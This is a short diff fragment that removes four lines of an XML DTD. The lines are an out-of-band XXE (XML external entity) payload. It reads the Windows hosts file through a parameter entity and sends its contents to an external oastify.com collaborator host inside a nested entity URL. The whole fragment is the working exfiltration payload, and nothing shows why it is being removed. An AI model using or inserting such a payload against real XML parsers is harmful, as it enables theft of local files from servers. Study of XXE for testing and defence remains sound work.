@@ -1,4 +1,0 @@
-<!ENTITY % payload SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://ovnd37rlkdjflijunw8t7h53wu2lqcs0h.oastify.com/x=%payload;">'>
-%param1;
-%external;
